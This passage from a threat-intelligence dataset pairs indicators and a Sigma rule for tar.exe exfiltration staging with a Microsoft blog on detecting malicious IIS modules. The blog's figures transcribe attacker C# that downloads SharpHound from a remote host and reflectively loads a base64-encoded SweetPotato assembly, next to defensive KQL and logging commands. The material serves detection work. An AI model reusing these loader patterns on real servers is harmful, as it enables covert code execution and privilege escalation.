8b6ad87e408e38fc1db868da6e643f616dac59fbae08382c4a7dd4ea119ea057\n- d5e38ac1187c607e701f506c4015bde94be6c485d566d004d810d7565c188743\n- 26460aa2df29f766cb5712ebca44cb3365ebfdb5cae0b2ec36ef1e3568911d6a\n- cdec58a57381bb8c1e374efb0bf1897d89d1e096d2b704820893859d9f08d086\n- ea9d994de91389280b334f2af991baa49ca613a6bf898d7bb25f88cc66488f5c\n- 3f5b623222c755d59052fab9e096c9d2b9a47d06b3a5de62fb9a66750af4efc4\n- 27873e3d4ec3a0e7d66bee8bda4d65cc8fcefbdca2c8d5c049372a63ff0bc2ed\n- cf3ae16b01f7eb129e0e7387ac7feb61ecfce5db0d7494b3962c02c681f504d4\n- 578ea26729b43fd976365a6700c80950e0b71a39e67bfff715423d60ae6bfab9\n- 03ab1588acaabdb509e9db7cfe1e60522bc8baa13bbd35160b4bde7d1b6402ef\n- 4a08eb0eb1f4ebb54bceabbebcb7da48238f0278ae5421326ee65ec7951e4239\n\n**IP Addresses:**\n\n- 178.73.210.238\n- 188.119.112.225\n- 213.252.246.245\n- 45.14.224.93\n- 45.67.230.134\n- 81.7.7.159\n- 95.179.143.32",
    "sigma_rule": {
      "title": "Compressed File Creation Via Tar.EXE",
      "id": "418a3163-3247-4b7b-9933-dcfcb7c52ea9",
      "status": "test",
      "description": "Detects execution of \"tar.exe\" in order to create a compressed file.\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration.\n",
      "references": [
        "https://unit42.paloaltonetworks.com/chromeloader-malware/",
        "https://lolbas-project.github.io/lolbas/Binaries/Tar/",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), AdmU3",
      "date": "2023-12-19",
      "tags": [
        "attack.collection",
        "attack.exfiltration",
        "attack.t1560",
        "attack.t1560.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\tar.exe"
          },
          {
            "OriginalFileName": "bsdtar"
          }
        ],
        "selection_create": {
          "CommandLine|contains": [
            "-c",
            "-r",
            "-u"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Likely"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_tar_compression.yml"
  },
  "39": {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/",
    "markdown": "# IIS modules: The evolution of web shells and how to detect them\n\n**December 12, 2022**\n\n---\n\nThe Microsoft Detection and Response Team (DART) has been renamed to Microsoft Incident Response (Microsoft IR). For more information on IR services, go to Microsoft Incident Response.\n\nWeb exploitation and web shells are some of the most common entry points in the current threat landscape. Web servers provide an external avenue directly into your corporate network, which often results in web servers being an initial intrusion vector or mechanism of persistence. Monitoring for exploitation and web shells should be a high priority for all networks, and while these detection techniques are targeted towards malicious IIS modules, a lot of these techniques will also provide general web shell detections.\n\nIIS modules and the creation of persistent backdoors by malicious IIS modules has recently been addressed in the Microsoft Security blog titled Malicious IIS modules creating persistent backdoors. In this blog by Microsoft Detection and Response Team (DART), we aim to provide further guidance on detecting malicious IIS modules and other capabilities (such as logging) that you can use during your own investigations. While we will cover Microsoft Defender for Endpoint detections in this blog, these detection methods should be tool agnostic. The queries listed are not definitive detection queries, but rather a base query that you can build on to suit your specific environment.\n\n## A history of malicious IIS modules\n\nThe concept of malicious IIS has been around since at least 2013. Historical malware analysis shows how crimeware groups used IIS modules to intercept client logons and payment details by using the BeginRequest triggers to read user-provided parameters before the webserver processes them.\n\nOne of the first examples of sophisticated IIS modules was discovered in late 2021. The vendor’s ICEAPPLE report details an IIS module that was used by an actor to reflectively load further .NET modules, which by extension, loads further .NET capability. This allowed the actor to have minimal malicious indicators in the base IIS module, then load further capabilities as required.\n\nA more recent example was provided in a recent Microsoft blog, where the actor instead opted for child process execution rather than loading the capability directly into w3wp.exe. This blog delves further into the capability to discuss the different capabilities that malicious IIS modules have access to.\n\n## Malicious IIS modules techniques\n\n### Event handlers\n\nA core part of IIS module functionality is event handling. Event triggers provide opportunities for code to be called when specific actions happen. IIS modules have access to 27 event triggers by default, including:\n\n- **Begin Request**: When a request is received by the webserver.\n- **End Request**: When a response is about to be sent to the client.\n- **Error**: When an error happens.\n- **Log Request**: When a request is about to be logged.\n\nEvent handlers, which run when their associated trigger is fired, can allow an actor to essentially setup a proxy on the IIS server. By setting up an event handler on the BeginRequest, EndRequest, and Error event triggers, the actor can intercept all requests before the web service can process them and before the response is sent to the client.\n\n```image\nAlt: Figure 1. Diagram showing how the malicious IIS module sits between the web server and the client\nDescription: The image illustrates the concept of a malicious IIS module positioned between a web server and a client. It includes labeled arrows indicating the flow of events: 'BeginRequest', 'EndRequest', and 'Error', which represent key event triggers in the IIS module’s functionality. To the left, there is a simplistic representation of a web server, and to the right, a figure resembling a person with a hat and a laptop, suggesting a hacker. The diagram is designed to visually explain how the malicious module intercepts and manipulates requests and responses.\nTranscription: |\n  Malicious IIS module\n  \n  BeginRequest\n  <--\n  EndRequest\n  <--\n  Error\n  <--\n```\n\nEvent handlers are given full read and write access to the requests, which allows malicious IIS modules to hide web shell communications within any aspect on the web request, turning every page that does and does not exist into a web shell. This can include hiding web shell communications in the parameters, body, headers, or HTTP methods.\n\nThese aspects of malicious IIS modules make them very hard to detect in standard IIS logs. You cannot rely on usual web shell detection strategies, such as high frequency page requests or URI patterns. Malicious IIS modules instead require new detection techniques and use of advanced IIS logging.\n\n### Request and response tampering\n\nAn additional difficulty with malicious IIS modules is that they can tamper with any aspect of the request and/or response. This could include removing web shell commands from parameters or headers and preventing web shell commands from being logged.\n\nIIS Modules can also intercept responses before they are sent, which presents the opportunity for an actor to serve malicious payloads into any response from the website, potentially infecting viewers of the website.\n\n### Process creation\n\n‘W3wp.exe’, also known as IIS worker processes, is utilized by web applications that run within IIS. Process creation is the most common indication of a web shell on IIS servers. Monitoring for the creation of common shell tooling (cmd, PowerShell, rundll32, mshta) with the parent process w3wp.exe can help detect low-sophistication IIS modules.\n\nThis should not be considered a strong detection for IIS modules. With full integration with C# and the .NET framework, a large amount of functionality can be integrated to execute directly within the IIS process without relying on creating child processes.\n\n### .NET assembly loading\n\nA common execution path for actors is to load .NET modules directly into memory through reflectively loading assemblies. This can allow common tools, such as SharpHound or the Potato PrivEsc family, to be loaded without being written to disk. This is also seen as a stealthier alternative to process creation because it’s within the context of w3wp.exe rather than within a child process.\n\n```image\nAlt: Figure 2. SweetPotato named pipes being created from within w3wp.exe\nDescription: The image displays an event log detailing the creation of a named pipe by the process w3wp.exe. Key information includes the event time (9/3/2022, 7:00:25 PM), the action type (NamedPipeEvent), and the user context (IIS APPPOOL\\defaultapppool). The pipe name is specified as '\\Device\\NamedPipe\\dbc4eb6b-96c0-4c8f-8632-e28d2885cf1b\\pipe\\spoolss'. Additional details such as desired access, thread ID, file operation, and remote client access status are also included, indicating the technical context and potential security implications of this event.\nTranscription: |\n  w3wp.exe created named pipe \\Device\\NamedPipe\\dbc4eb6b-96c0-4c8f-8632-e28d2885cf1b\\pipe\\spoolss\n  \n  Event info\n  Event: w3wp.exe created named pipe \\Device\\NamedPipe\\dbc4eb6b-96c0-4c8f-8632-e28d2885cf1b\\pipe\\spoolss\n  Event time: 9/3/2022, 7:00:25.004 PM\n  Action type: NamedPipeEvent\n  User: IIS APPPOOL\\defaultapppool\n  Initiating process: w3wp.exe\n  Pipe name: \\Device\\NamedPipe\\dbc4eb6b-96c0-4c8f-8632-e28d2885cf1b\\pipe\\spoolss\n  Desired access: 1180063\n  Thread id: 5116\n  File operation: Create\n  Remote client access: True\n  Session id: 0\n  Entities: services.exe > svchost.exe > w3wp.exe\n```\n\nAs mentioned in the vendor paper earlier, assemblies can be provided arbitrarily to deliver additional functionality. This may be through providing the assembly through the web request or downloading the assembly from an actor-controlled C2. The figure below shows:\n\n1. SharpHound being downloaded from an external C2 and loaded through the Reflection Assembly Load method.\n2. Two methods being invoked within the binary and the output directory being set to ProgramData.\n\n```image\nAlt: Figure 3. Example of an IIS module remotely downloading SharpHound and reflectively invoking it\nDescription: The image is a code snippet written in C#. It demonstrates the process of downloading a .NET assembly from a specified URL and reflectively loading it into memory. Key actions in the code include: downloading an executable file using a web client, loading the assembly with `Assembly.Load`, and invoking methods from the assembly. Specifically, it highlights the invocation of methods related to the 'SharpHound' program, indicating a potential malicious use case in a cybersecurity context.\nTranscription: |\n  case \"bh\":\n      byte[] sh = wc.DownloadData(@\"http://192.168.0.4/sh.exe\");\n      Assembly asm = Assembly.Load(sh);\n  \n      asm.GetType(\"Costura.AssemblyLoader\", false)\n          .GetMethod(\"Attach\", BindingFlags.Public | BindingFlags.Static)\n          .Invoke(null, null);\n  \n      asm.GetType(\"SharpHound.Program\")\n          .GetMethod(\"InvokeSharpHound\")\n          .Invoke(null, new object[] { new string[] { \"--OutputDirectory\", @\"C:\\ProgramData\\\" } });\n  \n  return \"success\";\n```\n\nWith access to .NET, malicious actors can add additional layers of evasion to prevent detection of their IIS modules, such as encoding or encryption. In the figure below, we can see:\n\n1. A base64 encoded blob and the size of the decoded assembly.\n2. A new memory allocation is made, where the assembly is decoded and deflated into the new allocation.\n3. The assembly is loaded and invoked, executing the command whoami.\n\n```image\nAlt: Figure 4. Example of SweetPotato being reflectively loaded and invoked\nDescription: The image displays a code snippet related to the 'Sweet Potato' payload used in IIS module techniques. It consists of three main sections: 1) A base64 encoded string representing the payload and its decompressed size. 2) Code that initializes a MemoryStream and DeflateStream to handle the base64 decoding and decompression of the payload. 3) The invocation of the decoded assembly using reflection to execute a method called 'Main' with parameters intended to run a 'whoami' command.\nTranscription: |\n  // Sweet Potato\n  string b64 = @\"TVqQAAMAAAAAAA...\"; // Base64 encoded string truncated for brevity\n  int defSize = 926208;\n  \n  MemoryStream ms = new MemoryStream(Convert.FromBase64String(b64));\n  DeflateStream deflate = new DeflateStream(ms, CompressionMode.Decompress);\n  byte[] bytes = new byte[defSize];\n  deflate.Read(bytes, 0, defSize);\n  \n  Assembly.Load(bytes)\n      .GetType(\"SweetPotato.Program\")\n      .GetMethod(\"Main\")\n      .Invoke(null, new object[] { new string[] { \"-a\", \"whoami\" } });\n```\n\n### Logging and monitoring\n\n#### Advanced IIS Logs\n\nIIS logs are a great place to start hunting for web shells, but advanced IIS logging is recommended because IIS modules can remove malicious traffic from the standard IIS logs. The IIS Service can provide additional advanced logging, such as the Microsoft IIS Configuration Operational log, which can be enabled through the event log tool by using the following commands:\n\n- Lists additional logs available for IIS: `wevtutil el | findstr -i IIS`\n- Configuration for the selected log: `wevtutil gl Microsoft-IIS-Configuration/Operational`\n- Enable the selected log: `wevtutil sl /e:true Microsoft-IIS-Configuration/Operational`\n\n```image\nAlt: Figure 5. Example showing wevtutil querying the IIS Configuration Operational event log\nDescription: The image displays a command-line interface output from a Windows system, showing the results of two commands executed using `wevtutil`. The first command (`wevtutil el | findstr -i IIS`) lists various IIS logs, including 'Microsoft-IIS-Configuration/Administrative', 'Analytic', 'Debug', and 'Operational'. The second command (`wevtutil gl Microsoft-IIS-Configuration/Operational`) retrieves details about the 'Microsoft-IIS-Configuration/Operational' log, indicating that it is currently disabled. Key details such as the log file path, retention settings, and maximum size are also highlighted in the output.\nTranscription: |\n  C:\\WINDOWS\\system32>wevtutil.exe el | findstr IIS\n  Microsoft-IIS-Configuration/Administrative\n  Microsoft-IIS-Configuration/Analytic\n  Microsoft-IIS-Configuration/Debug\n  Microsoft-IIS-Logging/Logs\n  Microsoft-IIS-Configuration/Operational\n  \n  C:\\WINDOWS\\system32>wevtutil.exe gl \"Microsoft-IIS-Configuration/Operational\"\n  name: Microsoft-IIS-Configuration/Operational\n  enabled: false\n  type: Operational\n  owningPublisher: Microsoft-Windows-IIS-Configuration\n  isolation: Custom\n  channelAccess: O:BAG:Syd:PAR(A;FA;BA)\n  \n  logging:\n    logFileName: %systemroot%\\System32\\winevt\\Logs\\Microsoft-IIS-Configuration%4Operational.evtx\n    retention: false\n    autoBackup: false\n    maxSize: 1052672\n    fileMax: 1\n```\n\nThe log that we will be focusing on in this blog is the Microsoft IIS Configuration Operational log. When enabled, the default path for this log is `C:\\Windows\\System32\\winevt\\Logs\\Microsoft-IIS-Configuration%4Operational.evtx` (shown in the figure above).\n\nThe Microsoft IIS Configuration Operational log captures the additional and removal of IIS modules (Event ID 29). IIS modules are not commonly added to a production IIS server, so alerting on this event ID should be enabled within your SIEM or security products.\n\n```image\nAlt: Figure 6. Event ID 29 showing the IIS module ‘ProxyShell’ being added to the default website\nDescription: The image displays a log entry from the Microsoft IIS Configuration Operational log, specifically focusing on Event ID 29. It includes details such as the date and time of the event (31/07/2022 at 11:40:16 AM), the source (IIS-Configuration), and a verbose message indicating that changes to the modules have been committed. The log highlights the addition of the 'ProxyShell' module to the Default Web Site, providing critical information for monitoring and detecting potential malicious IIS module activity.\nTranscription: |\n  Microsoft-IIS-Configuration%40Operational  Number of events: 23\n  \n  Level          Date and Time           Source               Event ID  Task Category\n  Information    31/07/2022 11:40:16 AM  IIS-Configuration    50        None\n  Verbose        31/07/2022 11:40:16 AM  IIS-Configuration    29        None\n  Verbose        31/07/2022 11:40:16 AM  IIS-Configuration    29        None\n  Verbose        31/07/2022 11:40:16 AM  IIS-Configuration    29        None\n  Verbose        31/07/2022 11:40:16 AM  IIS-Configuration    29        None\n  Information    31/07/2022 11:33:31 AM  IIS-Configuration    50        None\n  \n  Event 29, IIS-Configuration\n  \n  General\n  Changes to '/system.webServer/modules/add[@name=\"ProxyShell\"]' at 'MACHINE/WEBROOT/APPHOST/Default Web Site' have successfully been committed.\n  \n  Details\n  Log Name:      Microsoft-IIS-Configuration/Operational\n  Source:        IIS-Configuration\n  Event ID:      29\n  Level:         Verbose\n  User:          [User]\n  OpCode:        Info\n  More Information: Event Log Online Help\n```\n\nNote: This IIS module has no correlation with the Exchange Vulnerability ProxyShell.\n\n```image\nAlt: Figure 7. Event ID 29 showing the IIS module ‘ProxyShell’ being removed from the default website\nDescription: The image displays a screenshot of the Microsoft IIS Configuration Operational event log. It shows a table containing various entries with columns for Level, Date and Time, Source, Event ID, and Task Category. The highlighted entry corresponds to Event ID 29, indicating that the IIS module 'ProxyShell' has been removed from the Default Web Site. Below the table, there is a detailed description confirming that changes to the specified module have been successfully committed.\nTranscription: |\n  Microsoft-IIS-Configuration%40Operational  Number of events: 23\n  \n  Level        Date and Time           Source               Event ID  Task Category\n  Information  31/07/2022 11:41:52 AM  IIS-Configuration    50        None\n  Verbose      31/07/2022 11:41:52 AM  IIS-Configuration    29        None\n  Information  31/07/2022 11:40:16 AM  IIS-Configuration    50        None\n  Verbose      31/07/2022 11:40:16 AM  IIS-Configuration    29        None\n  Verbose      31/07/2022 11:40:16 AM  IIS-Configuration    29        None\n  Verbose      31/07/2022 11:40:16 AM  IIS-Configuration    29        None\n  \n  Event 29, IIS-Configuration\n  \n  General\n  Changes to '/system.webServer/modules/remove[@name=\"ProxyShell\"]' at 'MACHINE/WEBROOT/APPHOST/Default Web Site' have successfully been committed.\n  \n  Log Name: Microsoft-IIS-Configuration/Operational\n  Source: IIS-Configuration\n  Event ID: 29\n  Level: Verbose\n  User:\n  OpCode: Info\n  More Information: Event Log Online Help\n```\n\n### IIS module listing\n\nIIS modules can be installed at a global level or at a site level. In detecting malicious IIS modules, it is important to check both the global and site level for unauthorized modules. Regular monitoring of these locations for such modules and comparing against a known good list can help detect and identify malicious IIS modules. Appcmd (path: %windir%\\system32\\inetsrv\\appcmd.exe), a command line tool for managing your IIS servers, can be used to that purpose. The command ‘appcmd list modules’ will list global IIS modules on your server. The command ‘appcmd list modules /app.name:<appName>/’ will let you search specific websites.\n\n```image\nAlt: Figure 8. Appcmd listing the modules for Default Web Site and showing two malicious modules: “ProxyShell” and “Malicious IIS Module”\nDescription: The image depicts a command line interface output showing a list of IIS modules for the 'Default Web Site.' It details various modules including two identified as malicious: 'ProxyShell' and 'Malicious IIS Module.' Each entry lists the module name followed by its type and pre-condition. The output provides a technical view of the module configuration, relevant for detecting unauthorized modules in IIS.\nTranscription: |\n  C:\\Windows\\System32\\inetsrv>appcmd.exe list modules /app.name:\"Default Web Site/\"\n  MODULE \"IsapiModule\" ( native, preCondition: )\n  MODULE \"IsapiFilterModule\" ( native, preCondition: )\n  MODULE \"HttpLoggingModule\" ( native, preCondition: )\n  MODULE \"HttpCacheModule\" ( native, preCondition: )\n  MODULE \"StaticCompressionModule\" ( native, preCondition: )\n  MODULE \"DefaultDocumentModule\" ( native, preCondition: )\n  MODULE \"DirectoryListingModule\" ( native, preCondition: )\n  MODULE \"ProtocolSupportModule\" ( native, preCondition: )\n  MODULE \"StaticFileModule\" ( native, preCondition: )\n  MODULE \"AnonymousAuthenticationModule\" ( native, preCondition: )\n  MODULE \"RequestFilteringModule\" ( native, preCondition: )\n  MODULE \"CustomErrorModule\" ( type:System.Web.Caching.OutputCacheModule, preCondition:managedHandler )\n  MODULE \"OutputCache\" ( type:System.Web.SessionState.SessionModule, preCondition:managedHandler )\n  MODULE \"Session\" ( type:System.Web.SessionState.SessionModule, preCondition:managedHandler )\n  MODULE \"WindowsAuthentication\" ( type:System.Web.Security.WindowsAuthenticationModule, preCondition:managedHandler )\n  MODULE \"FormsAuthentication\" ( type:System.Web.Security.FormsAuthenticationModule, preCondition:managedHandler )\n  MODULE \"DefaultAuthentication\" ( type:System.Web.Security.DefaultAuthenticationModule, preCondition:managedHandler )\n  MODULE \"RoleManager\" ( type:System.Web.Security.RoleManagerModule, preCondition:managedHandler )\n  MODULE \"UrlAuthorization\" ( type:System.Web.Security.UrlAuthorizationModule, preCondition:managedHandler )\n  MODULE \"FileAuthorization\" ( type:System.Web.Security.FileAuthorizationModule, preCondition:managedHandler )\n  MODULE \"AnonymousIdentification\" ( type:System.Web.Security.AnonymousIdentificationModule, preCondition:managedHandler )\n  MODULE \"Profile\" ( type:System.Web.Profile.ProfileModule, preCondition:managedHandler )\n  MODULE \"UrlMappingsModule\" ( type:System.Web.UrlMappingsModule, preCondition:managedHandler )\n  MODULE \"ConfigurationValidationModule\" ( )\n  MODULE \"UrlRoutingModule-4.0\" ( type:System.Web.Routing.UrlRoutingModule, preCondition:managedHandler,runtimeVersion=4.0 )\n  MODULE \"ScriptModule-4.0\" ( type:System.Web.Handlers.ScriptModule, System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35, preCondition: )\n  MODULE \"CustomLoggingModule\" ( native, preCondition: )\n  MODULE \"FailedRequestsTracingModule\" ( native, preCondition: )\n  MODULE \"ProxyShell\" ( type:System.Web.Security.ProxyShell, preCondition: )\n  MODULE \"Malicious IIS Module\" ( type:System.Web.Security.ProxyShell, preCondition: )\n```\n\nModules listed through appcmd will be ordered based on the order of installation. In Figure 9, the two malicious IIS modules, ProxyShell and Malicious IIS Module, were the two most recent IIS modules installed and therefore the last two on the list. The type parameter also shows the class that is called when the module is loaded.\n\n### Web.config\n\nThe web.config file, which details the settings for a website, can include modules that the website loads and should therefore be monitored when detecting malicious IIS modules. Monitoring of web.config should primarily focus on tracking modifications to the file, and can be done through multiple tools and sources. For example, the Microsoft IIS Configuration Operational event log produces Event ID 50 when a modification is made to a website. Because the content of the modification is not captured, a backup of the web.config should be stored for easy comparison between the modified file and the original.\n\n```image\nAlt: Figure 9. Event ID 50 showing that a modification has been made to default website\nDescription: The image displays an event log from the Microsoft IIS Configuration Operational log, specifically showing Event ID 50. It details an event that occurred on 31/07/2022 at 11:41:52 AM, indicating that changes were successfully committed to the 'MACHINE/WEBROOT/APPHOST/Default Web Site'. The log includes multiple entries, with various levels (Information, Verbose) and references to the source as IIS-Configuration. The bottom section outlines the log details such as user, computer, and op code.\nTranscription: |\n  Microsoft-IIS-Configuration%40Operational  Number of events: 23\n  \n  Level       Date and Time           Source              Event ID  Task Category\n  Information 31/07/2022 11:41:52 AM  IIS-Configuration   50        None\n  Verbose     31/07/2022 11:41:52 AM  IIS-Configuration   29        None\n  Verbose     31/07/2022 11:41:52 AM  IIS-Configuration   29        None\n  Verbose     31/07/2022 11:40:16 AM  IIS-Configuration   50        None\n  Verbose     31/07/2022 11:40:16 AM  IIS-Configuration   29        None\n  Verbose     31/07/2022 11:40:16 AM  IIS-Configuration   29        None\n  Verbose     31/07/2022 11:40:16 AM  IIS-Configuration   29        None\n  \n  Event 50, IIS-Configuration\n  General\n  Changes have successfully been committed to 'MACHINE/WEBROOT/APPHOST/Default Web Site'.\n  \n  Log Name: Microsoft-IIS-Configuration/Operational\n  Source: IIS-Configuration\n  Logged: 31/07/2022 11:41:52 AM\n  Event ID: 50\n  Level: Information\n  Keywords:\n  User:\n  Computer: home\n  OpCode: Info\n  More Information: Event Log Online Help\n```\n\nMost EDRs capture file modification events as well. Enabling an alert for the modification of web.config, especially from the w3wp.exe process, will enable detection of unwarranted changes to the config.\n\n## Hunting for malicious IIS modules\n\n### IIS module loading\n\nWhile loaded IIS modules are standardly loaded DLLs, not all tools list .NET modules that are loaded into w3wp.exe. One tool that does show IIS modules loaded into w3wp.exe is Process Hacker, which if used with administrative privileges, will show them under the Modules tab.\n\n```image\nAlt: Figure 10. Malicious ProxyShell IIS module loaded within the w3wp.exe process\nDescription: The image displays the properties window of the w3wp.exe process, specifically highlighting the loaded IIS module named ProxyShell.DLL. It shows details such as the base address (0x1563bfd0000) and size (3 MB) of the module, along with various tabs relevant to the process like Memory, Environment, and Handles. This information is crucial for identifying malicious IIS modules that may have been loaded into the w3wp.exe process.\nTranscription: |\n  w3wp.exe (12728) Properties\n  \n  Memory        Environment        Handles        Job        .NET assemblies\n  General       Statistics         Performance    Threads    Token        Modules\n  \n  Name                     Base address       Size\n  ProxyShell.DLL          0x1563bfd0000      3 MB\n```\n\nIn Microsoft Defender for Endpoint, an IIS module that is loaded into w3wp.exe will appear twice: First when loaded from the bin directory from which it resides, then immediately after from the temporary ASP.NET directory.\n\n```image\nAlt: Figure 11. Malicious IIS module ProxyShell being listed in Defender for Endpoint\nDescription: The image appears to be a screenshot of a query result in a security monitoring tool, displaying the output of a KQL (Kusto Query Language) query related to the ProxyShell IIS module. It shows a list of folder paths where the ProxyShell DLL is located, including its directory in the 'C:\\inetpub\\wwwroot\\bin\\' as well as a temporary ASP.NET directory. The interface indicates the query execution time and results, emphasizing usage in monitoring for malicious IIS modules.\nTranscription: |\n  DeviceImageLoadEvents\n  | where FileName has \"ProxyShell\"\n  | where InitiatingProcessFileName has \"w3wp.exe\"\n  | project FolderPath\n  \n  Getting Started   Results\n  ------------------------------\n  FolderPath\n  ------------------------------\n  C:\\inetpub\\wwwroot\\bin\\ProxyShell.dll\n  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Temporary ASP.NET Files\\root\\e22c2559\\92c7e946\\assembly\\dl3\\db6147e5\\e6334bff_63bfd801\\ProxyShell.DLL\n```\n\nBy default, IIS modules are loaded when the w3wp.exe process is created. If an IIS module is loaded while the w3wp.exe process is already executing and at a different time than the rest of the module, it can be an indicator for malicious IIS module loading. Monitoring for abnormal module loads may help detect malicious IIS modules. Using a query like the KQL one below can group together modules loaded into w3wp.exe at the same second. In Figure 12, we can see a large number of modules being loaded within a three second time period, followed by the malicious ProxyShell IIS module three hours later.\n\n```\nDeviceImageLoadEvents\n| where InitiatingProcessFileName has \"w3wp.exe\"\n| summarize loaded_modules=make_set(FileName) by format_datetime(Timestamp, 'yy-MM-dd HH:mm:ss')\n| project Timestamp, loaded_modules, count=array_length(loaded_modules)\n```\n\n```image\nAlt: Figure 12. Anomalous module loading based on timeframe of other IIS modules\nDescription: The image depicts a query result table from a cybersecurity tool, likely showing the output of a KQL query for monitoring module loads within the w3wp.exe process. It includes columns for 'Timestamp', 'loaded_modules', and 'count', detailing the specific modules loaded at various timestamps along with their respective counts. The displayed data indicates the presence of a malicious module, 'ProxyShell.dll', and showcases how many modules were loaded during each recorded time interval, emphasizing the importance of monitoring IIS modules for potential security threats.\nTranscription: |\n  DeviceImageLoadEvents\n  | where InitiatingProcessFileName has \"w3wp.exe\"\n  | summarize loaded_modules=make_set(FileName) by format_datetime(Timestamp, 'yy-MM-dd HH:mm:ss')\n  | project Timestamp, loaded_modules, count=array_length(loaded_modules)\n  \n  Getting Started  Results\n  Export\n  7 items  Search\n  Timestamp                loaded_modules                                        count\n  22-09-03 04:16:57        [\"version.dll\",\"System.ni.dll\",\"System.Web.dll\"]      10\n  22-09-03 04:16:58        [\"System.ServiceModel.Activation.ni.dll\"]             21\n  22-09-03 04:16:59        [\"System.Web.Mobile.ni.dll\",\"System.Web.dll\"]         2\n  22-09-03 07:11:09        [\"ProxyShell.dll\",\"ProxyShell.DLL\"]                   3\n```\n\n#### Assembly loading\n\nWhile IIS modules have the capability to load .NET modules arbitrarily and reflectively within the context of w3wp.exe, the AppDomains are still registered within the hosting process. By listing AppDomain loaded within an assembly through a tool like Process Hacker, you’ll be able to find the loaded IIS module and any .NET modules that have been loaded.\n\n```image\nAlt: Figure 13. Malicious ProxyShell IIS module, SharpHound and SweetPotato App Domains\nDescription: The image shows the properties window of the process 'w3wp.exe' within the Process Hacker tool, detailing the loaded .NET assemblies in the context of IIS module analysis. It highlights specific AppDomains and lists assemblies such as 'ProxyShell', 'SharpHound', 'SharpHoundCommonLib', and 'SweetPotato'. The relevant ID flags and the structure of the loaded assemblies are displayed, providing critical information for detecting malicious IIS modules.\nTranscription: |\n  w3wp.exe (22084) Properties\n  \n  Tabs: \n  - .NET performance\n  - GPU\n  - Disk and Network\n  - Comment\n  - General\n  - Statistics\n  - Performance\n  - Threads\n  - Token\n  - Modules\n  - Memory\n  - Environment\n  - Handles\n  - Job\n  - .NET assemblies\n  \n  Structure:\n  CLR v4.0.30319.0\n  AppDomain: DefaultDomain\n    - ID: 268289...\n    - Flags: Default, Executable\n  \n  AppDomain: /LM/W3SVC/1/ROOT-2-133...\n    - ID: 268289...\n    - Flags: Executable\n    - CommandLine: 270243...\n    - Microsoft.Extensions.Logging.Abstract...: 270243...\n    - Microsoft.VisualStudio.Debugger.Run...: 270243...\n    - Newtonsoft.Json: 270243...\n    - ProxyShell: 270243...\n    - SharpHound: 270243...\n    - SharpHoundCommonLib: 270243...\n    - SweetPotato: 270243...\n    - SweetPotato: 270243...\n  \n  AppDomain: SharedDomain\n    - ID: 140707...\n    - Flags: Shared\n    - Microsoft.Build.Utilities.v4.0: 270243... (DomainNeutral, Native)\n    - Microsoft.CSharp: 270243... (DomainNeutral, Native)\n    - Microsoft.JScript: 270243... (DomainNeutral, Native)\n    - mscorlib: 268289... (DomainNeutral, Native)\n    - System: 268289... (DomainNeutral, Native)\n    - System.Activities: 270243... (DomainNeutral, Native)\n    - System.ComponentModel.DataAnnotations: 270243... (DomainNeutral, Native)\n    - System.Configuration: 268290... (DomainNeutral, Native)\n    - System.Core: 268289... (DomainNeutral, Native)\n    - System.Data: 270243... (DomainNeutral, Native)\n    - System.Data.DataSetExtensions: 270243... (DomainNeutral, Native)\n    - System.DirectoryServices: 270243... (DomainNeutral, Native)\n    - System.DirectoryServices.Protocols: 270243... (DomainNeutral, Native)\n    - System.Drawing: 270243... (DomainNeutral, Native)\n    - System.EnterpriseServices\n  \n  Close\n```\n\nIn the figure above, the malicious IIS module ProxyShell can be seen alongside the loaded assemblies SharpHound and SweetPotato. Another thing to note is that reflectively loaded modules usually do not have Flags: in Figure 13, all the assemblies without Flags are either loaded through the malicious IIS module or through Visual Studio debugging.\n\nThe ETW provider Microsoft-Windows-DotNETRuntimeRundown provides a snapshot in time of the loaded .NET modules within active processes. Two events can help detect malicious assemblies loaded within IIS:\n\n- Event ID 151 lists loaded AppDomains.\n- Event ID 155 enumerates assemblies loaded at the time of the rundown.\n\nThe ModuleILPath field shows the path of the loaded assembly; however, if this assembly is loaded reflectively, rather than a path to the file, it will instead just list the name of the assembly. The figure below shows how SharpHound and SweetPotato, both with reflectively loaded assemblies, do not have paths while other events do.\n\n```image\nAlt: Figure 14. Example of reflectively loaded assemblies not having a file path within the ModuleILPath field\nDescription: The image displays a snippet of code or log data that relates to the loading of .NET modules within IIS. It highlights specific entries for the 'ModuleILPath' associated with the malicious modules 'SharpHound' and 'SweetPotato', indicating the paths or identifiers of these assemblies. The data is structured in a format showing various attributes like 'ThreadID', 'ProcessID', 'TimeStamp', and 'ModuleNativePath', which are crucial for understanding the context of the loaded modules within the IIS environment.\nTranscription: |\n  json\n  {\n    \"ModuleILPath\": \"SharpHound\",\n    \"ProcessID\": 22084,\n    \"ThreadID\": 23644,\n    \"TimeStamp\": \"2022-10-06T13:30:14.5241443+11:00\",\n    \"ModuleNativePath\": \"\",\n    \"NativePdbAge\": \"0\",\n    \"Keyword\": 8,\n    \"Header\": {\n      \"ID\": 151\n    }\n  },\n  {\n    \"ModuleILPath\": \"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\",\n    \"ProcessID\": 22084,\n    \"ThreadID\": 23644,\n    \"TimeStamp\": \"2022-10-06T13:30:14.5428094+11:00\",\n    \"ModuleNativePath\": \"\",\n    \"NativePdbAge\": \"0\"\n  },\n  {\n    \"ModuleILPath\": \"SweetPotato\",\n    \"ProcessID\": 22084,\n    \"ThreadID\": 23644,\n    \"TimeStamp\": \"2022-10-06T13:30:14.543694+11:00\",\n    \"ModuleNativePath\": \"\",\n    \"NativePdbAge\": \"0\",\n    \"Keyword\": 8,\n    \"Header\": {\n      \"ID\": 151\n    }\n  }\n```\n\nThe Assembly Flags field may also be 0, similar to Figure 13 where Process Hacker shows empty Flags for the assemblies.\n\n```image\nAlt: Figure 15. Example of 